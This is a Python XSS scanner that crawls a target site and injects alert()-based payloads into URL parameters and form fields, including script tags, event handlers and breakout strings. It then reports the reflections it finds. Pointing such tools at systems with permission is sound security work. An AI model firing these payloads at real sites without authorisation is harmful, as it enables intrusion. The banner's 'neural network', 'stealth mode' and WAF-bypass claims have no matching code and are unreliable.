#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced XSS Scanner - Production Version
Professional XSS Detection Tool with Strict Verification
"""

import requests
import re
import time
import json
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import random
import os
import sys
from datetime import datetime
import hashlib
import argparse
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XSSScanner:
    def __init__(self, target_url, max_depth=3, delay=1, timeout=10):
        self.target_url = target_url
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.delay = delay
        self.timeout = timeout
        
        # Setup session
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Results
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.forms = []
        self.parameters = {}
        self.confirmed_targets = set()  # Track confirmed vulnerabilities to avoid duplicates
        
        # Custom signature
        self.signature = "XSS_CONFIRMED_" + hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        # Enhanced payloads with tag closing
        self.payloads = {
            'html': [
                f'<script>alert("{self.signature}")</script>',
                f'<img src=x onerror=alert("{self.signature}")>',
                f'<svg onload=alert("{self.signature}")>',
                f'<iframe src="javascript:alert(\'{self.signature}\')"></iframe>',
            ],
            'attribute': [
                f'"><img src=x onerror=alert("{self.signature}")>',  # Close tag first
                f'\'>< img src=x onerror=alert("{self.signature}")>',
                f'"><svg onload=alert("{self.signature}")>',
                f'\'>< svg onload=alert("{self.signature}")>',
                f'"><script>alert("{self.signature}")</script>',
                f'" onmouseover="alert(\'{self.signature}\')" "',
                f'\' onmouseover=\'alert("{self.signature}")\' \'',
                f'" onfocus="alert(\'{self.signature}\')" autofocus "',
            ],
            'javascript': [
                f'\'; alert("{self.signature}"); //',
                f'\"; alert(\'{self.signature}\'); //',
                f'`; alert("{self.signature}"); //',
                f'</script><script>alert("{self.signature}")</script>',
            ],
            'url': [
                f'javascript:alert("{self.signature}")',
                f'data:text/html,<script>alert("{self.signature}")</script>',
            ]
        }
        
        # Statistics
        self.stats = {
            'urls_crawled': 0,
            'forms_found': 0,
            'parameters_found': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0,
            'reflections_found': 0,
            'confirmed_vulns': 0
        }

    def print_banner(self):
        """Matrix-style banner"""
        banner = f"""
{Fore.GREEN}
╔══════════════════════════════════════════════════════════════════════╗
║  {Fore.RED}██{Fore.GREEN}╗  {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗    {Fore.RED}███████{Fore.GREEN}╗ {Fore.RED}██████{Fore.GREEN}╗ {Fore.RED}█████{Fore.GREEN}╗ {Fore.RED}███{Fore.GREEN}╗   {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}██████{Fore.GREEN}╗  ║
║  {Fore.RED}╚██╗██╔╝{Fore.GREEN}██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗ ║
║   {Fore.RED}╚███╔╝ {Fore.GREEN}███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║█████╗  ██████╔╝ ║
║   {Fore.RED}██╔██╗ {Fore.GREEN}╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗ ║
║  {Fore.RED}██╔╝ ██╗{Fore.GREEN}███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║███████╗██║  ██║ ║
║  {Fore.RED}╚═╝  ╚═╝{Fore.GREEN}╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ║
╠══════════════════════════════════════════════════════════════════════╣
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Advanced Cross-Site Scripting Detection Framework     ║
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Professional Penetration Testing Tool               ║
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}WAF Bypass • Context-Aware • Strict Verification    ║
╠══════════════════════════════════════════════════════════════════════╣
║  {Fore.YELLOW}Target:{Fore.WHITE} {self.target_url:<55} ║
║  {Fore.YELLOW}Config:{Fore.WHITE} Depth={self.max_depth} | Delay={self.delay}s | Timeout={self.timeout}s{' ' * (50 - len(f'Depth={self.max_depth} | Delay={self.delay}s | Timeout={self.timeout}s'))} ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}

{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Initializing neural network...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Loading payload database...{Fore.GREEN} DONE  
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Activating stealth mode...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Strict verification mode...{Fore.GREEN} ENABLED
"""
        print(banner)

    def test_connectivity(self):
        """Test target connectivity"""
        print(f"{Fore.GREEN}[{Fore.RED}INIT{Fore.GREEN}] {Fore.WHITE}Testing target connectivity...")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            print(f"{Fore.GREEN}[{Fore.RED}CONN{Fore.GREEN}] {Fore.WHITE}Target responded - Status: {response.status_code}")
            return True
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Connection failed - Check target URL")
            return False
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Connectivity test failed: {e}")
            return False

    def crawl_target(self):
        """Crawl target and discover test points"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 1{Fore.GREEN}] {Fore.WHITE}RECONNAISSANCE & TARGET ENUMERATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        urls_to_scan = [self.target_url]
        
        # Add common endpoints
        base_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}"
        common_paths = [
            '/search', '/login', '/contact', '/register', '/profile',
            '/search?q=test', '/index.php?id=1', '/?search=test',
            '/artists.php?artist=1', '/listproducts.php?cat=1'
        ]
        
        for path in common_paths:
            urls_to_scan.append(base_url + path)
        
        for url in urls_to_scan[:15]:  # Scan more URLs
            try:
                print(f"{Fore.GREEN}[{Fore.RED}CRAWL{Fore.GREEN}] {Fore.WHITE}Scanning: {url}")
                
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code == 200:
                    self.crawled_urls.add(url)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract forms
                    forms = soup.find_all('form')
                    for form in forms:
                        form_data = self.extract_form_data(form, url)
                        if form_data and form_data not in self.forms:
                            self.forms.append(form_data)
                            print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}Found: {form_data['action']} ({len(form_data['inputs'])} inputs)")
                    
                    # Extract parameters
                    parsed = urlparse(url)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        if url not in self.parameters:
                            self.parameters[url] = {}
                        for param, values in params.items():
                            self.parameters[url][param] = values[0] if values else ''
                            print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}Found: {param}")
                
                time.sleep(self.delay)
                
            except Exception as e:
                print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}{url} - {str(e)[:30]}")
        
        # Update stats
        self.stats['urls_crawled'] = len(self.crawled_urls)
        self.stats['forms_found'] = len(self.forms)
        self.stats['parameters_found'] = sum(len(p) for p in self.parameters.values())
        
        print(f"\n{Fore.GREEN}[{Fore.RED}RECON{Fore.GREEN}] {Fore.WHITE}Reconnaissance Summary:")
        print(f"{Fore.GREEN}[{Fore.RED}INFO{Fore.GREEN}] {Fore.WHITE}URLs: {self.stats['urls_crawled']} | Forms: {self.stats['forms_found']} | Parameters: {self.stats['parameters_found']}")

    def extract_form_data(self, form, base_url):
        """Extract form data"""
        try:
            action = form.get('action', '') or base_url
            action_url = urljoin(base_url, action)
            method = form.get('method', 'GET').upper()
            
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name', '')
                if name and input_tag.get('type', '') not in ['submit', 'button']:
                    inputs.append({
                        'name': name,
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    })
            
            if inputs:
                return {
                    'action': action_url,
                    'method': method,
                    'inputs': inputs,
                    'base_url': base_url
                }
        except:
            pass
        return None

    def test_parameters(self):
        """Test URL parameters for XSS"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 2{Fore.GREEN}] {Fore.WHITE}PARAMETER EXPLOITATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        if not self.parameters:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No parameters to test")
            return
        
        for url, params in self.parameters.items():
            for param_name in params:
                target_key = f"{url}#{param_name}"
                
                # Skip if already confirmed vulnerable
                if target_key in self.confirmed_targets:
                    print(f"{Fore.CYAN}[{Fore.RED}SKIP{Fore.CYAN}] {Fore.WHITE}Parameter {param_name} already confirmed")
                    continue
                
                print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Testing parameter: {param_name}")
                
                # Test each context until we find a confirmed vulnerability
                vulnerability_found = False
                for context, payloads in self.payloads.items():
                    if vulnerability_found:
                        break
                        
                    print(f"{Fore.CYAN}[{Fore.RED}CONTEXT{Fore.CYAN}] {Fore.WHITE}Testing {context} context...")
                    
                    for payload in payloads:
                        if self.test_single_parameter(url, param_name, payload, context):
                            vulnerability_found = True
                            self.confirmed_targets.add(target_key)
                            print(f"{Fore.GREEN}[{Fore.RED}SUCCESS{Fore.GREEN}] {Fore.WHITE}Vulnerability confirmed - stopping tests for {param_name}")
                            break
                        time.sleep(self.delay)
                
                if not vulnerability_found:
                    print(f"{Fore.CYAN}[{Fore.RED}CLEAN{Fore.CYAN}] {Fore.WHITE}No vulnerability confirmed in parameter: {param_name}")

    def test_single_parameter(self, url, param_name, payload, context):
        """Test single parameter with strict verification"""
        try:
            # Build test URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query) if parsed.query else {}
            params[param_name] = [payload]
            
            test_query = urllib.parse.urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            
            # Make request
            response = self.session.get(test_url, timeout=self.timeout)
            self.stats['payloads_tested'] += 1
            
            # Check for reflection
            if self.check_strong_reflection(response, payload, context):
                self.stats['reflections_found'] += 1
                print(f"{Fore.YELLOW}[{Fore.RED}REFLECT{Fore.YELLOW}] {Fore.WHITE}Strong reflection detected - {context} context")
                
                # STRICT VERIFICATION: Only confirm if payload is executed in dangerous context
                if self.verify_execution_context(response, payload, context):
                    vuln = {
                        'type': 'Reflected XSS',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'context': context,
                        'confirmed': True,
                        'score': 20,
                        'timestamp': datetime.now().isoformat(),
                        'verification': 'Strong reflection in executable context'
                    }
                    
                    self.vulnerabilities.append(vuln)
                    self.stats['confirmed_vulns'] += 1
                    
                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}XSS VULNERABILITY CONFIRMED!")
                    print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}{param_name}")
                    print(f"{Fore.GREEN}[{Fore.RED}URL{Fore.GREEN}] {Fore.WHITE}{test_url}")
                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                    print(f"{Fore.GREEN}[{Fore.RED}CONTEXT{Fore.GREEN}] {Fore.WHITE}{context}")
                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                    
                    return True
                else:
                    print(f"{Fore.RED}[{Fore.YELLOW}SAFE{Fore.RED}] {Fore.WHITE}Payload reflected but not in executable context")
                    return False
            
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Test failed: {str(e)[:30]}")
            return False

    def check_strong_reflection(self, response, payload, context):
        """Check for strong reflection indicators"""
        try:
            response_text = response.text
            
            # Check if our signature is reflected
            if self.signature not in response_text:
                return False
            
            # Context-specific strong reflection checks
            if context == 'html':
                # Look for unescaped script tags
                if ('<script>' in payload and '<script>' in response_text and 
                    'alert(' in payload and 'alert(' in response_text):
                    return True
                # Look for unescaped event handlers
                if ('onerror=' in payload and 'onerror=' in response_text):
                    return True
                if ('onload=' in payload and 'onload=' in response_text):
                    return True
                    
            elif context == 'attribute':
                # Look for attribute breaking
                if ('"><' in payload and '"><' in response_text):
                    return True
                if ('\'>< ' in payload and '\'>< ' in response_text):
                    return True
                # Look for event handler injection
                if ('onmouseover=' in payload and 'onmouseover=' in response_text):
                    return True
                if ('onfocus=' in payload and 'onfocus=' in response_text):
                    return True
                    
            elif context == 'javascript':
                # Look for JavaScript context breaking
                if ('\'; alert(' in payload and '\'; alert(' in response_text):
                    return True
                if ('\"; alert(' in payload and '\"; alert(' in response_text):
                    return True
                if ('</script><script>' in payload and '</script><script>' in response_text):
                    return True
                    
            elif context == 'url':
                # Look for URL context
                if ('javascript:' in payload and 'javascript:' in response_text):
                    return True
                if ('data:text/html,' in payload and 'data:text/html,' in response_text):
                    return True
            
            return False
        except:
            return False

    def verify_execution_context(self, response, payload, context):
        """Verify if payload would execute in browser"""
        try:
            response_text = response.text
            
            # STRICT: Only confirm if payload appears in dangerous, executable context
            
            if context == 'html':
                # Check if script tag is properly formed and not escaped
                script_pattern = rf'<script[^>]*>[^<]*{re.escape(self.signature)}[^<]*</script>'
                if re.search(script_pattern, response_text, re.IGNORECASE):
                    return True
                
                # Check for event handlers in tags
                event_pattern = rf'<[^>]+onerror\s*=\s*[\'"][^\'">]*{re.escape(self.signature)}[^\'">]*[\'"][^>]*>'
                if re.search(event_pattern, response_text, re.IGNORECASE):
                    return True
                    
            elif context == 'attribute':
                # Check if we successfully broke out of attribute
                breakout_patterns = [
                    rf'"[^>]*><[^>]+{re.escape(self.signature)}',
                    rf"'[^>]*><[^>]+{re.escape(self.signature)}",
                ]
                for pattern in breakout_patterns:
                    if re.search(pattern, response_text):
                        return True
                        
            elif context == 'javascript':
                # Check if we're in executable JavaScript context
                js_patterns = [
                    rf'<script[^>]*>[^<]*[\'"];[^<]*{re.escape(self.signature)}[^<]*</script>',
                    rf'</script>[^<]*<script[^>]*>[^<]*{re.escape(self.signature)}[^<]*</script>',
                ]
                for pattern in js_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return True
                        
            elif context == 'url':
                # Check if in href or similar URL context
                url_pattern = rf'(href|src)\s*=\s*[\'"]javascript:[^\'">]*{re.escape(self.signature)}[^\'">]*[\'"]'
                if re.search(url_pattern, response_text, re.IGNORECASE):
                    return True
            
            return False
        except:
            return False

    def test_forms(self):
        """Test forms for XSS"""
        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing Forms...")
        
        if not self.forms:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No forms to test")
            return
        
        for form in self.forms:
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Form: {form['action']} ({form['method']})")
            
            for input_field in form['inputs']:
                input_name = input_field['name']
                target_key = f"{form['action']}#{input_name}"
                
                # Skip if already confirmed
                if target_key in self.confirmed_targets:
                    print(f"{Fore.CYAN}[{Fore.RED}SKIP{Fore.CYAN}] {Fore.WHITE}Input {input_name} already confirmed")
                    continue
                
                print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}Testing: {input_name}")
                
                # Test until confirmed vulnerability found
                vulnerability_found = False
                for context, payloads in self.payloads.items():
                    if vulnerability_found:
                        break
                        
                    print(f"{Fore.CYAN}[{Fore.RED}CONTEXT{Fore.CYAN}] {Fore.WHITE}Testing {context} context...")
                    
                    for payload in payloads:
                        if self.test_form_input(form, input_name, payload, context):
                            vulnerability_found = True
                            self.confirmed_targets.add(target_key)
                            print(f"{Fore.GREEN}[{Fore.RED}SUCCESS{Fore.GREEN}] {Fore.WHITE}Vulnerability confirmed - stopping tests for {input_name}")
                            break
                        time.sleep(self.delay)
                
                if not vulnerability_found:
                    print(f"{Fore.CYAN}[{Fore.RED}CLEAN{Fore.CYAN}] {Fore.WHITE}No vulnerability confirmed in input: {input_name}")

    def test_form_input(self, form, input_name, payload, context):
        """Test form input with strict verification"""
        try:
            # Prepare form data
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == input_name:
                    form_data[input_field['name']] = payload
                else:
                    if 'email' in input_field['name'].lower():
                        form_data[input_field['name']] = 'test@example.com'
                    else:
                        form_data[input_field['name']] = input_field['value'] or 'test'
            
            # Submit form
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
            else:
                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
            
            self.stats['payloads_tested'] += 1
            
            # Check for strong reflection
            if self.check_strong_reflection(response, payload, context):
                self.stats['reflections_found'] += 1
                print(f"{Fore.YELLOW}[{Fore.RED}REFLECT{Fore.YELLOW}] {Fore.WHITE}Strong reflection in {input_name} - {context} context")
                
                # Verify execution context
                if self.verify_execution_context(response, payload, context):
                    vuln = {
                        'type': 'Form XSS',
                        'url': form['action'],
                        'parameter': input_name,
                        'payload': payload,
                        'context': context,
                        'method': form.get('method', 'GET'),
                        'confirmed': True,
                        'score': 20,
                        'timestamp': datetime.now().isoformat(),
                        'verification': 'Strong reflection in executable context'
                    }
                    
                    self.vulnerabilities.append(vuln)
                    self.stats['confirmed_vulns'] += 1
                    
                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}FORM XSS VULNERABILITY CONFIRMED!")
                    print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}{input_name}")
                    print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}{form['action']}")
                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                    print(f"{Fore.GREEN}[{Fore.RED}CONTEXT{Fore.GREEN}] {Fore.WHITE}{context}")
                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                    
                    return True
                else:
                    print(f"{Fore.RED}[{Fore.YELLOW}SAFE{Fore.RED}] {Fore.WHITE}Reflected but not in executable context")
                    return False
            
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Form test failed: {str(e)[:30]}")
            return False

    def generate_report(self):
        """Generate comprehensive HTML report"""
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
            color: #00ff00;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #00ff00;
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }}
        .stat-card {{
            background: rgba(0, 50, 0, 0.5);
            border: 1px solid #00ff00;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }}
        .stat-number {{
            font-size: 2em;
            color: #ff0000;
            font-weight: bold;
            text-shadow: 0 0 10px #ff0000;
        }}
        .vulnerability {{
            background: rgba(50, 0, 0, 0.5);
            border: 2px solid #ff0000;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
        }}
        .payload {{
            background: #000;
            color: #00ff00;
            padding: 15px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
            overflow-x: auto;
            word-break: break-all;
        }}
        .score {{
            background: linear-gradient(45deg, #ff0000, #ff6600);
            color: white;
            padding: 8px 15px;
            border-radius: 15px;
            font-weight: bold;
        }}
        .confirmed {{
            color: #00ff00;
            font-weight: bold;
            text-shadow: 0 0 5px #00ff00;
        }}
        .method {{
            background: #333;
            color: #fff;
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 0.9em;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>XSS SCANNER INTELLIGENCE REPORT</h1>
            <h2>{self.target_url}</h2>
            <p>SCAN TIMESTAMP: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p class="confirmed">VERIFICATION: STRICT CONTEXT ANALYSIS</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{self.stats['urls_crawled']}</div>
                <div>URLS CRAWLED</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['forms_found']}</div>
                <div>FORMS FOUND</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['parameters_found']}</div>
                <div>PARAMETERS</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['payloads_tested']}</div>
                <div>PAYLOADS TESTED</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['reflections_found']}</div>
                <div>REFLECTIONS</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['confirmed_vulns']}</div>
                <div>CONFIRMED VULNS</div>
            </div>
        </div>
        
        <h2>CONFIRMED VULNERABILITIES</h2>
        <p><em>Only vulnerabilities confirmed through strict context analysis are reported</em></p>
"""
        
        if not self.vulnerabilities:
            html_content += """
        <div style="background: rgba(0, 50, 0, 0.3); border: 1px solid #00ff00; padding: 20px; border-radius: 5px; text-align: center;">
            <h3>NO CONFIRMED VULNERABILITIES</h3>
            <p>Target appears secure against XSS attacks</p>
            <p><strong>Note:</strong> Only vulnerabilities that would execute in browser are reported</p>
        </div>
"""
        else:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                html_content += f"""
        <div class="vulnerability">
            <h3>VULNERABILITY #{i} - {vuln['type']} <span class="confirmed">[CONFIRMED]</span></h3>
            <p><strong>URL:</strong> {vuln['url']}</p>
            <p><strong>PARAMETER:</strong> {vuln['parameter']}</p>
            <p><strong>METHOD:</strong> <span class="method">{vuln['method']}</span></p>
            <p><strong>CONTEXT:</strong> {vuln['context']}</p>
            <p><strong>VERIFICATION:</strong> {vuln['verification']}</p>
            <p><strong>SCORE:</strong> <span class="score">{vuln['score']}/20</span></p>
            <p><strong>PAYLOAD:</strong></p>
            <div class="payload">{vuln['payload']}</div>
            <p><strong>TIMESTAMP:</strong> {vuln['timestamp']}</p>
        </div>
"""
        
        html_content += """
        <div style="margin-top: 30px; padding: 20px; background: rgba(0, 50, 0, 0.3); border: 1px solid #00ff00; border-radius: 5px;">
            <h3>VERIFICATION METHODOLOGY</h3>
            <p>✅ Strict context analysis for payload execution verification</p>
            <p>✅ Only payloads that would execute in browser are confirmed</p>
            <p>✅ Multiple context types tested: HTML, Attribute, JavaScript, URL</p>
            <p>✅ Tag closing attacks included: "><img src=x onerror=alert()></p>
            <p>⚠️ Reflected payloads that don't execute are NOT reported as vulnerabilities</p>
        </div>
    </div>
</body>
</html>
"""
        
        filename = f"xss_report_strict_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}HTML report: {filename}")
        return filename

    def generate_json_report(self):
        """Generate JSON report"""
        report_data = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'verification_method': 'strict_context_analysis',
            'statistics': self.stats,
            'vulnerabilities': self.vulnerabilities,
            'methodology': {
                'verification': 'Only payloads confirmed to execute in browser context',
                'contexts_tested': list(self.payloads.keys()),
                'tag_closing_included': True,
                'waf_bypass_techniques': True
            }
        }
        
        filename = f"xss_report_strict_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}JSON report: {filename}")
        return filename

    def run_scan(self):
        """Run complete scan with strict verification"""
        self.print_banner()
        
        try:
            # Test connectivity
            if not self.test_connectivity():
                print(f"{Fore.RED}[{Fore.YELLOW}ABORT{Fore.RED}] {Fore.WHITE}Cannot connect to target")
                return
            
            # Phase 1: Crawling
            self.crawl_target()
            
            # Phase 2: Testing
            self.test_parameters()
            self.test_forms()
            
            # Generate reports
            print(f"\n{Fore.YELLOW}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}GENERATING VERIFIED REPORTS")
            print(f"{Fore.YELLOW}{'='*70}")
            
            html_report = self.generate_report()
            json_report = self.generate_json_report()
            
            # Final results
            print(f"\n{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}RESULTS{Fore.GREEN}] {Fore.WHITE}SCAN COMPLETE - STRICT VERIFICATION")
            print(f"{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}{self.target_url}")
            print(f"{Fore.GREEN}[{Fore.RED}CRAWLED{Fore.GREEN}] {Fore.WHITE}{self.stats['urls_crawled']} URLs")
            print(f"{Fore.GREEN}[{Fore.RED}FORMS{Fore.GREEN}] {Fore.WHITE}{self.stats['forms_found']} forms")
            print(f"{Fore.GREEN}[{Fore.RED}PARAMETERS{Fore.GREEN}] {Fore.WHITE}{self.stats['parameters_found']} parameters")
            print(f"{Fore.GREEN}[{Fore.RED}PAYLOADS{Fore.GREEN}] {Fore.WHITE}{self.stats['payloads_tested']} payloads tested")
            print(f"{Fore.GREEN}[{Fore.RED}REFLECTIONS{Fore.GREEN}] {Fore.WHITE}{self.stats['reflections_found']} reflections found")
            print(f"{Fore.GREEN}[{Fore.RED}CONFIRMED{Fore.GREEN}] {Fore.WHITE}{self.stats['confirmed_vulns']} vulnerabilities confirmed")
            
            if self.vulnerabilities:
                print(f"\n{Fore.RED}[{Fore.GREEN}CRITICAL{Fore.RED}] {Fore.WHITE}CONFIRMED VULNERABILITIES:")
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    method = vuln.get('method', 'GET')
                    print(f"{Fore.RED}[{i}] {Fore.WHITE}{vuln['type']} in {vuln['parameter']} ({vuln['context']} context) - Score: {vuln['score']}/20")
                    print(f"    {Fore.CYAN}URL: {vuln['url']}")
                    print(f"    {Fore.CYAN}Method: {method}")
                    print(f"    {Fore.CYAN}Payload: {vuln['payload']}")
            else:
                print(f"\n{Fore.GREEN}[{Fore.RED}SECURE{Fore.GREEN}] {Fore.WHITE}No confirmed vulnerabilities found")
                if self.stats['reflections_found'] > 0:
                    print(f"{Fore.YELLOW}[{Fore.RED}INFO{Fore.YELLOW}] {Fore.WHITE}{self.stats['reflections_found']} reflections found but none confirmed as executable")
            
            print(f"\n{Fore.GREEN}[{Fore.RED}FILES{Fore.GREEN}] {Fore.WHITE}Reports: {html_report}, {json_report}")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[{Fore.RED}ABORT{Fore.YELLOW}] {Fore.WHITE}Scan interrupted")
        except Exception as e:
            print(f"\n{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Scan failed: {e}")

def main():
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner - Production Version with Strict Verification')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Crawl depth (default: 2)')
    parser.add_argument('--delay', type=float, default=0.8, help='Delay between requests (default: 0.8)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[ERROR] URL must start with http:// or https://")
        sys.exit(1)
    
    scanner = XSSScanner(
        target_url=args.url,
        max_depth=args.depth,
        delay=args.delay,
        timeout=args.timeout
    )
    
    scanner.run_scan()

if __name__ == "__main__":
    main()